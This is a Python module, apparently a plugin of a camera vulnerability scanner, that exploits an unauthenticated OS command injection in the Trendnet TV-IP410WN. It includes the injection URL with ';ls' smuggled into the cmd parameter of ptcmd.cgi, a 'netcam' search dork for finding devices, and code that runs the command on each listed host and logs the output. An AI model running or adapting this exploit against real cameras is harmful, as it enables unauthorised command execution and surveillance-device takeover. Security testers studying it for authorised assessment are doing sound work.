"""
http://192.168.1.101/cgi/maker/ptcmd.cgi?cmd=;ls
Trendnet TV-IP410WN
https://media.blackhat.com/us-13/US-13-Heffner-Exploiting-Network-Surveillance-Cameras-Like-A-Hollywood-Hacker-Slides.pdf
dork: netcam
"""

import requests
import logging
import httplib2

# Console colors
W = '\033[0m'  # white (normal)
R = '\033[31m' # red
G = '\033[32m' # green


class IP_TV():

    def __init__(self, target_list):
        self.target_list = target_list
        self.findings = []

    def check_host(self, target, port):
        """
        Send testing request to server to check if it responds with a 200 to any requests
        :param target: string
        :param port: string
        :return: boolean
        """
        url = target+':'+port
        test_strings = ['/sjf_hdid','/s_a?jghjf/','/']
        response = 0
        errors = 0
        for test in test_strings:
            try:
                conn = httplib2.Http(disable_ssl_certificate_validation=True)
                if port == '443':
                    try:
                        resp, content = conn.request('https://' + url + test, 'GET')
                        if resp['status'] == '200':
                            response += 1
                    except:
                        pass
                else:
                    resp, content = conn.request('http://' + url + test, 'HEAD')

                if resp['status'] == '200':
                    response += 1

            except ConnectionError as e:
                errors += 1
                logging.debug('Error: '+str(e))

        if errors == 3:
            logging.debug(R+'Error limit reached for host %s:%s' %(target,port)+W)
            return False

        elif response == 3:
            logging.warning(R+'Ambiguous response from web server on %s:%s. All URIs return status 200' %(target, port)+W)
            return False

        return True

    def run(self):
        for target in self.target_list:
            ip = target.split(':')[0]
            port = target.split(':')[1]
            logging.info('Testing: %s:%s' % (ip, port))
            if self.check_host(ip, port):
                self.os_command_Injection(ip, port)

        return self.findings


    def os_command_Injection(self, ip,port):
        try:
            cmd = 'ls'
            req = requests.get('http://%s:%s/cgi/maker/ptcmd.cgi?cmd=;%s' % (ip, port,cmd))
            logging.debug('URL: ' + str(req.url))
            logging.debug('Head: ' + str(req.headers))
            res = req.text
            logging.debug('RES: ' + res)
            if str(req.status_code) == '200':
                logging.info(G + 'Target %s:%s is vulnerable to OS Command Injection!' % (ip, port) + W)
                finding = ip + ';' + port + ';' + 'HTTP' + ';' + 'OS Command Injection' + ';' +'TV-IP410'+';'+ 'URL: ' + str(
                    req.url) + ' Command result: '+str(res)
                self.findings.append(finding)
        except Exception as e:
            logging.warning('Error with host: %s:%s Details: %s'%(ip,port,str(e)))